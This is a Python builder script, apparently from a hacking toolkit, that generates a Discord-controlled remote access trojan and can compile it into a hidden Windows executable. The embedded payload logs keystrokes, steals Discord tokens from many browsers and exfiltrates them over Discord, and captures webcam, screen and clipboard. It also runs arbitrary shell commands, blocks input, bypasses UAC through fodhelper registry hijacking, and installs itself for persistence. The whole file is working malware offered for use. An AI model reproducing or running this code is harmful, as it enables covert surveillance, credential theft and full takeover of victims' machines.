from colorama import Fore
import time, sys, os
from util.plugins.commun import * 

def discordrat():
    setTitle("Rat Tool")
    def spinner():
        l = ['|', '/', '-', '\\']
        for i in l+l:
            sys.stdout.write(f"""\r{y}[{b}#{y}]{w} Creating File... {i}""")
            sys.stdout.flush()
            time.sleep(0.2)
        print('\n')
        for i in l+l+l+l:
            sys.stdout.write(f"""\r{y}[{b}#{y}]{w} Writing File... {i}""")
            sys.stdout.flush()
            time.sleep(0.2)

    clear()
    rattitle()
    print(f"""{y}[{w}+{y}]{w} Enter the name you want to give to the final file: """)
    global filename
    fileName = str(input(f"""{y}[{b}#{y}]{w} File name: """))
    print(f"""\n{y}[{w}+{y}]{w} Enter the token of the bot you will use to execute the RAT commands: """)
    global tokenbot
    tokenbot = str(input(f"""{y}[{b}#{y}]{w} Bot token: """))
    print(f"""\n{y}[{w}+{y}]{w} Enter the guild ID on which the slash commands are registered: """)
    guildid = str(input(f"""{y}[{b}#{y}]{w} Guild ID: """))
    print('\n')
    spinner()

    try:
        with open(f"output/{fileName}.py", "w") as file:
            file.write("""import discord 
import json 
import subprocess 
import asyncio 
import ctypes 
import os 
import logging 
import threading 
import requests 
import time 
import cv2 
import win32clipboard
import win32process
import win32con
import win32gui
import winreg
import re
import sys
import shutil
import pyautogui

from urllib.request import urlopen, urlretrieve
from time import sleep
from mss import mss
from pynput.keyboard import Listener
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

from discord_components import *

from discord.ext import commands
from discord_slash.context import ComponentContext
from discord_slash import SlashContext, SlashCommand
from discord_slash.model import ButtonStyle
from discord_slash.utils.manage_components import create_button, create_actionrow, create_select, create_select_option, wait_for_component

client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), description='Discord RAT to shits on pc\\'s')
slash = SlashCommand(client, sync_commands=True)

token = '~~TOKENHERE~~'

@client.event
async def on_slash_command_error(ctx, error):
    if isinstance(error, discord.ext.commands.errors.MissingPermissions):
        await ctx.send('You do not have permission to execute this command')
    else:
        print(error)

@client.event
async def on_command_error(cmd, error):
    if isinstance(error, discord.ext.commands.errors.CommandNotFound):
        pass

async def activity(client):
    while True:
        if stop_threads:
            break
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        await client.change_presence(status=discord.Status.online, activity=discord.Game(f"Visiting: {window}"))
        sleep(1)

@client.event
async def on_ready():
    global channel_name
    DiscordComponents(client)
    number = 0
    with urlopen("http://ipinfo.io/json") as url:
        data = json.loads(url.read().decode())
        ip = data['ip']
        country = data['country']
        city = data['city']

    process2 = subprocess.Popen("wmic os get Caption", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
    wtype = process2.communicate()[0].decode().strip("Caption\\n").strip()

    for x in client.get_all_channels():
        (on_ready.total).append(x.name)
    for y in range(len(on_ready.total)):
        if "session" in on_ready.total[y]:
            result = [e for e in re.split("[^0-9]", on_ready.total[y]) if e != '']
            biggest = max(map(int, result))
            number = biggest + 1
        else:
            pass  

    if number == 0:
        channel_name = "session-1"
        await client.guilds[0].create_text_channel(channel_name)
    else:
        channel_name = f"session-{number}"
        await client.guilds[0].create_text_channel(channel_name)
        
    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = client.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    value1 = f"@here ✔ New session, opened **{channel_name}** | **{wtype}** | **{ip}, {country}/{city}**\\n> Succesfully gained access to user **`{os.getlogin()}`**"
    if is_admin == True:
        await channel.send(f'{value1} with **`admin`** perms')
    elif is_admin == False:
        await channel.send(value1)
    game = discord.Game(f"Window logging stopped")
    await client.change_presence(status=discord.Status.online, activity=game)

on_ready.total = []

def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()

def MaxVolume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)

def MuteVolume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)


@slash.slash(name="kill", description="kills all inactive sessions", guild_ids=g)
async def kill_command(ctx: SlashContext):
    for y in range(len(on_ready.total)): 
        if "session" in on_ready.total[y]:
            channel_to_delete = discord.utils.get(client.get_all_channels(), name=on_ready.total[y])
            await channel_to_delete.delete()
        else:
            pass
    await ctx.send(f"Killed all the inactive sessions")


@slash.slash(name="exit", description="stop the program on victims pc", guild_ids=g)
async def exit_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        buttons = [
                create_button(
                    style=ButtonStyle.green,
                    label="✔"
                ),
                create_button(
                    style=ButtonStyle.red,
                    label="X"
                ),
              ]
        action_row = create_actionrow(*buttons)
        await ctx.send("Are you sure you want to exit the program on your victims pc?", components=[action_row])

        res = await client.wait_for('button_click')
        if res.component.label == "✔":
            await ctx.send(content="Exited the program!", hidden=True)
            os._exit(0)
        else:
            await ctx.send(content="Cancelled the exit", hidden=True)


@slash.slash(name="info", description="gather info about the user", guild_ids=g)
async def info_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        url = 'http://ipinfo.io/json'
        response = urlopen(url)
        data = json.load(response)
        UsingVPN = json.load(urlopen("http://ip-api.com/json?fields=proxy"))['proxy']
        googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
        process = subprocess.Popen("wmic path softwarelicensingservice get OA3xOriginalProductKey", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        wkey = process.communicate()[0].decode().strip("OA3xOriginalProductKeyn\\n").strip()
        process2 = subprocess.Popen("wmic os get Caption", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        wtype = process2.communicate()[0].decode().strip("Caption\\n").strip()

        userdata = f"```fix\\n------- {os.getlogin()} -------\\nComputername: {os.getenv('COMPUTERNAME')}\\nIP: {data['ip']}\\nUsing VPN?: {UsingVPN}\\nOrg: {data['org']}\\nCity: {data['city']}\\nRegion: {data['region']}\\nPostal: {data['postal']}\\nWindowskey: {wkey}\\nWindows Type: {wtype}\\n```**Map location: {googlemap}**\\n"
        await ctx.send(userdata)


@slash.slash(name="startkeylogger", description="start a key logger on their pc", guild_ids=g)
async def startKeyLogger_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
            logging.basicConfig(filename=os.path.join(os.getenv('TEMP') + "\\key_log.txt"),
                                level=logging.DEBUG, format='%%(asctime)s: %%(ctx)s')
            def keylog():
                def on_press(key):
                    logging.info(str(key))
                with Listener(on_press=on_press) as listener:
                    listener.join()
            global logger
            logger = threading.Thread(target=keylog)
            logger._running = True
            logger.daemon = True
            logger.start()
            await ctx.send("Keylogger Started!")


@slash.slash(name="stopkeylogger", description="stop the key logger", guild_ids=g)
async def stopKeyLogger_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        logger._running = False
        await ctx.send("Keylogger Stopped!")


@slash.slash(name="KeyLogDump", description="dumb the keylogs", guild_ids=g)
async def KeyLogDump_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        file_keys = os.path.join(os.getenv("TEMP") + "\\key_log.txt")
        file = discord.File(file_keys, filename=file_keys)
        await ctx.send("Successfully dumped all the logs", file=file)
        os.remove(file_keys)


@slash.slash(name="tokens", description="get all their discord tokens", guild_ids=g)
async def TokenExtractor_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send(f"extracting tokens...")
        tokens = []
        saved = ""
        paths = {
            'Discord': os.getenv('APPDATA') + r'\\\\discord\\\\Local Storage\\\\leveldb\\\\',
            'Discord Canary': os.getenv('APPDATA') + r'\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\',
            'Lightcord': os.getenv('APPDATA') + r'\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\',
            'Discord PTB': os.getenv('APPDATA') + r'\\\\discordptb\\\\Local Storage\\\\leveldb\\\\',
            'Opera': os.getenv('APPDATA') + r'\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\',
            'Opera GX': os.getenv('APPDATA') + r'\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\',
            'Amigo': os.getenv('LOCALAPPDATA') + r'\\\\Amigo\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'Torch': os.getenv('LOCALAPPDATA') + r'\\\\Torch\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'Kometa': os.getenv('LOCALAPPDATA') + r'\\\\Kometa\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'Orbitum': os.getenv('LOCALAPPDATA') + r'\\\\Orbitum\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'CentBrowser': os.getenv('LOCALAPPDATA') + r'\\\\CentBrowser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            '7Star': os.getenv('LOCALAPPDATA') + r'\\\\7Star\\\\7Star\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'Sputnik': os.getenv('LOCALAPPDATA') + r'\\\\Sputnik\\\\Sputnik\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'Vivaldi': os.getenv('LOCALAPPDATA') + r'\\\\Vivaldi\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
            'Chrome SxS': os.getenv('LOCALAPPDATA') + r'\\\\Google\\\\Chrome SxS\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'Chrome': os.getenv('LOCALAPPDATA') + r'\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
            'Epic Privacy Browser': os.getenv('LOCALAPPDATA') + r'\\\\Epic Privacy Browser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
            'Microsoft Edge': os.getenv('LOCALAPPDATA') + r'\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul\\\\Local Storage\\\\leveldb\\\\',
            'Uran': os.getenv('LOCALAPPDATA') + r'\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
            'Yandex': os.getenv('LOCALAPPDATA') + r'\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
            'Brave': os.getenv('LOCALAPPDATA') + r'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
            'Iridium': os.getenv('LOCALAPPDATA') + r'\\\\Iridium\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\'
        }
        for source, path in paths.items():
            if not os.path.exists(path):
                continue
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in re.findall(regex, line):
                            tokens.append(token)
        for token in tokens:
            r = requests.get("https://discord.com/api/v9/users/@me", headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
                "Authorization": token
            })
            if r.status_code == 200:
                if token in saved:
                    continue
                saved += f"`{token}`\\n\\n"
        if saved != "":
            await ctx.send(f"**Token(s) succesfully grabbed:** \\n{saved}")
        else:
            await ctx.send(f"**User didn't have any stored tokens**")


@slash.slash(name="windowstart", description="start the window logger", guild_ids=g)
async def windowstart_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        global stop_threads
        stop_threads = False

        threading.Thread(target=between_callback, args=(client,)).start()
        await ctx.send("Window logging for this session started")


@slash.slash(name="windowstop", description="stop window logger", guild_ids=g)
async def windowstop_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        global stop_threads
        stop_threads = True

        await ctx.send("Window logging for this session stopped")
        game = discord.Game(f"Window logging stopped")
        await client.change_presence(status=discord.Status.online, activity=game)


def change_res(cap, width, height):
    cap.set(3, width)
    cap.set(4, height)

def get_dims(cap, res='1080p'):
    STD_DIMENSIONS =  {
        "480p": (640, 480),
        "720p": (1280, 720),
        "1080p": (1920, 1080),
        "4k": (3840, 2160),
    }
    width, height = STD_DIMENSIONS["480p"]
    if res in STD_DIMENSIONS:
        width,height = STD_DIMENSIONS[res]
    change_res(cap, width, height)
    return width, height

@slash.slash(name="webcam", description="takes a video of their webcam", guild_ids=g)
async def webcam_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send("Taking video of webcam. . .")
        temp = os.path.join(f"{os.getenv('TEMP')}\\\\video.mp4")
        res = '720p'
        t_end = time.time() + 2

        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            out = cv2.VideoWriter(temp, cv2.VideoWriter_fourcc(*'X264'), 25, get_dims(cap, res))
            while time.time() < t_end:
                ret, frame = cap.read()
                out.write(frame)
            cap.release()
            out.release()
            cv2.destroyAllWindows()
        else:
            await ctx.send(f"**{os.getlogin()}'s** has no webcam :/")
        file = discord.File(temp, filename="video.mp4")
        await ctx.send("Webcam Video taken!", file=file)
        os.remove(temp)


@slash.slash(name="screenshot", description="take a screenshot", guild_ids=g)
async def screenshot_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        temp = os.path.join(os.getenv('TEMP') + "\\\\monitor.png")
        with mss() as sct:
            sct.shot(output=temp)
        file = discord.File(temp, filename="monitor.png")
        await ctx.send("Screenshot taken!", file=file)
        os.remove(temp)


@slash.slash(name="MaxVolume", description="set their sound to max", guild_ids=g)
async def MaxVolume_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        MaxVolume()
        await ctx.send("Volume set to **100%**")


@slash.slash(name="MuteVolume", description="set their sound to 0", guild_ids=g)
async def MuteVolume_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        MuteVolume()
        await ctx.send("Volume set to **0%**")


@slash.slash(name="Wallpaper", description="Change their wallpaper", guild_ids=g)
async def Wallpaper_command(ctx: SlashContext, link: str):
    if ctx.channel.name == channel_name:
        if re.match(r'^(?:http|ftp)s?://', link) is not None:
            image_formats = ("image/png", "image/jpeg", "image/jpg", "image/x-icon",)
            r = requests.head(link)
            if r.headers["content-type"] in image_formats:
                path = os.path.join(os.getenv('TEMP') + "\\\\temp.jpg")
                urlretrieve(link, path)
                ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
                await ctx.send(f"Successfully Changed their wallpaper to:\\n{link}")
            else:
                await ctx.send("Link needs to be a url to an image!")
        else:
            await ctx.send("Invalid link!")


@slash.slash(name="Shell", description="run shell commands", guild_ids=g)
async def Shell_command(ctx: SlashContext, command: str):
    if ctx.channel.name == channel_name:
        def shell():
            output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            return output

        shel = threading.Thread(target=shell)
        shel._running = True
        shel.start()
        sleep(1)
        shel._running = False

        result = str(shell().stdout.decode('CP437'))
        numb = len(result)

        if result != "":
            if numb < 1:
                await ctx.send("unrecognized command or no output was obtained")
            elif numb > 1990:
                f1 = open("output.txt", 'a')
                f1.write(result)
                f1.close()
                file = discord.File("output.txt", filename="output.txt")

                await ctx.send("Command successfully executed", file=file)
                os.remove("output.txt")
            else:
                await ctx.send(f"Command successfully executed:\\n```\\n{result}```")
        else:
            await ctx.send("unrecognized command or no output was obtained")

@slash.slash(name="Write", description="Make the user type what ever you want", guild_ids=g)
async def Write_command(ctx: SlashContext, message: str):
    if ctx.channel.name == channel_name:
        await ctx.send(f"Typing. . .")
        for letter in message:
            pyautogui.typewrite(letter);sleep(0.0001)
        await ctx.send(f"Done typing\\n```\\n{message}```")


@slash.slash(name="Clipboard", description="get their current clipboard", guild_ids=g)
async def Clipboard_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        await ctx.send(f"Their Current Clipboard is:\\n```{data}```")


@slash.slash(name="AdminCheck", description=f"check if DiscordRAT has admin perms", guild_ids=g)
async def AdminCheck_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            embed = discord.Embed(title="AdminCheck", description=f"DiscordRAT Has Admin privileges!")
            await ctx.send(embed=embed)
        else:
            embed=discord.Embed(title="AdminCheck",description=f"DiscordRAT does not have admin privileges")
            await ctx.send(embed=embed)


@slash.slash(name="IdleTime", description=f"check for how long your victim has been idle for", guild_ids=g)
async def IdleTime_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        class LASTINPUTINFO(ctypes.Structure):
            _fields_ = [
                ('cbSize', ctypes.c_uint),
                ('dwTime', ctypes.c_int),
            ]
        def get_idle_duration():
            lastInputInfo = LASTINPUTINFO()
            lastInputInfo.cbSize = ctypes.sizeof(lastInputInfo)
            if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lastInputInfo)):
                millis = ctypes.windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                return millis / 1000
            else:
                return 0
        duration = get_idle_duration()
        await ctx.send(f"**{os.getlogin()}'s** been idle for {duration} seconds.")


@slash.slash(name="BlockInput", description="Blocks user's keyboard and mouse", guild_ids=g)
async def BlockInput_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            ctypes.windll.user32.BlockInput(True)
            await ctx.send(f"Blocked **{os.getlogin()}'s** keyboard and mouse")
        else:
            await ctx.send("Sorry! Admin rights are required for this command")


@slash.slash(name="UnblockInput", description="UnBlocks user's keyboard and mouse", guild_ids=g)
async def UnblockInput_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            ctypes.windll.user32.BlockInput(False)
            await ctx.send(f"Unblocked **{os.getlogin()}'s** keyboard and mouse")
        else:
            await ctx.send("Sorry! Admin rights are required for this command")
            

@slash.slash(name="MsgBox", description="make a messagebox popup on their screen with a custom message", guild_ids=g)
async def MessageBox_command(ctx: SlashContext, message: str):
    if ctx.channel.name == channel_name:
        def msgbox(message, type):
            return ctypes.windll.user32.MessageBoxW(0, message, "Attention!", type | 0x1000)

        select = create_select(
        options=[
            create_select_option(label="Error", value="Errors", emoji="X"),
            create_select_option(label="Warning", value="Warnings", emoji="⚠"),
            create_select_option(label="Info", value="Infos", emoji="ℹ"),
            create_select_option(label="Question", value="Questions", emoji="?"),
        ],
        placeholder="Choose your type", 
        min_values=1,
        max_values=1,
    )   
        await ctx.send("What type of messagebox do you want to popup?", components=[create_actionrow(select)])

        select_ctx: ComponentContext = await wait_for_component(client, components=[create_actionrow(select)])
        if select_ctx.selected_options[0] == 'Errors':
            threading.Thread(target=msgbox, args=(message, 16)).start()
            await select_ctx.edit_origin(content=f"Sent an Error Message Saying {message}")
        elif select_ctx.selected_options[0] == 'Warnings':
            threading.Thread(target=msgbox, args=(message, 48)).start()
            await select_ctx.edit_origin(content=f"Sent an Warning Message Saying {message}")
        elif select_ctx.selected_options[0] == 'Infos':
            threading.Thread(target=msgbox, args=(message, 64)).start()
            await select_ctx.edit_origin(content=f"Sent an Info Message Saying {message}")
        elif select_ctx.selected_options[0] == 'Questions':
            threading.Thread(target=msgbox, args=(message, 32)).start()
            await select_ctx.edit_origin(content=f"Sent an Question Message Asking {message}")


@slash.slash(name="Play", description="Play a chosen youtube video in background", guild_ids=g)
async def Play_command(ctx: SlashContext, youtube_link: str):
    if ctx.channel.name == channel_name:
        MaxVolume()
        if re.match(r'^(?:http|ftp)s?://', youtube_link) is not None:
            await ctx.send(f"Playing `{youtube_link}` on **{os.getlogin()}'s** computer")
            os.system(f'start {youtube_link}')
            while True:
                def get_all_hwnd(hwnd, mouse):
                    def winEnumHandler(hwnd, ctx):
                        if win32gui.IsWindowVisible(hwnd):
                            if "youtube" in (win32gui.GetWindowText(hwnd).lower()):
                                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
                                global pid_process
                                pid_process = win32process.GetWindowThreadProcessId(hwnd)
                                return "ok"
                        else:
                            pass
                    if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
                        win32gui.EnumWindows(winEnumHandler,None)
                try:
                    win32gui.EnumWindows(get_all_hwnd, 0)
                except:
                    break
        else:
            await ctx.send("Invalid Youtube Link")

@slash.slash(name="Stop_Play", description="stop the video", guild_ids=g)
async def Stop_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        ctx.send("stopped the music")
        os.system(f"taskkill /F /IM {pid_process[1]}")


@slash.slash(name="AdminForce", description="try and bypass uac and get admin rights", guild_ids=g)
async def AdminForce_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send(f"attempting to get admin privileges. . .")
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == False:
            os.system(\"""powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force\""")
            os.system(\"""powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force\""") 
            os.system(\"""powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start\""" + sys.argv[0] +"-Force")
            
            class disable_fsr():
                disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                def __enter__(self):
                    self.old_value = ctypes.c_long()
                    self.success = self.disable(ctypes.byref(self.old_value))
                def __exit__(self, type, value, traceback):
                    if self.success:
                        self.revert(self.old_value)
            with disable_fsr():
                os.system("fodhelper.exe")

            sleep(2)
            os.system(\"""powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force\""")
        else:
            await ctx.send("You already have admin privileges")


@slash.slash(name="Startup", description="Add the program to startup", guild_ids=g)
async def Startup_command(ctx: SlashContext, reg_name: str):
    if ctx.channel.name == channel_name:
        try:
            key1 = winreg.HKEY_CURRENT_USER
            key_value1 ="SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
            open_ = winreg.CreateKeyEx(key1,key_value1,0,winreg.KEY_WRITE)

            winreg.SetValueEx(open_,reg_name,0,winreg.REG_SZ, shutil.copy(sys.argv[0], os.getenv("appdata")+os.sep+os.path.basename(sys.argv[0])))
            open_.Close()
            await ctx.send("Successfully added it to `run` startup")
        except PermissionError:
            shutil.copy(sys.argv[0], os.getenv("appdata")+"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\"+os.path.basename(sys.argv[0]))
            await ctx.send("Permission was denied, added it to `startup folder` instead")

client.run(token)""".replace("~~TOKENHERE~~'", tokenbot + "'; g = [" + guildid + "]"))


    except Exception as e:
        print(f"""\n\n\n\n{y}[{Fore.LIGHTRED_EX }!{y}]{w}  Error writing file: {e}""")
        os.system(2)
        clear()
        main()

    print(f"""\n\n\n{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} File has been correctly written to "output/{fileName}.py" """)
    convert = input(f"""{y}[{b}#{y}]{w} Convert your script into an executable (Y/N) ? """)
    if convert.upper() == 'Y' or convert.upper() == 'YES':
        try:
            time.sleep(1)
            clear()

            print(f'{y}[{b}#{y}]{w} File creation...')
            time.sleep(1)
            os.system(f"pyinstaller -y -F -w output/{fileName}.py")
            clear()
            print(f'{y}[{b}#{y}]{w} Cleaning up old files...')
            time.sleep(1)
            try:
                import shutil
                os.remove(f"{fileName}.spec")
                shutil.rmtree(f"build")
                shutil.move(f"dist/{fileName}.exe", "output")
                shutil.rmtree(f"dist")
                time.sleep(1)
            except:
                pass
            clear()
            rattitle()
            print(f"{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} The executable file has been correctly generated")
        except:
            clear()
            rattitle()
            print(f"{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} The executable file has been correctly generated")
    
        input(f"{y}[{b}#{y}]{w} Press ENTER to exit")
    else:
        input(f"{y}[{b}#{y}]{w} Press ENTER to exit")
    main()

discordrat()
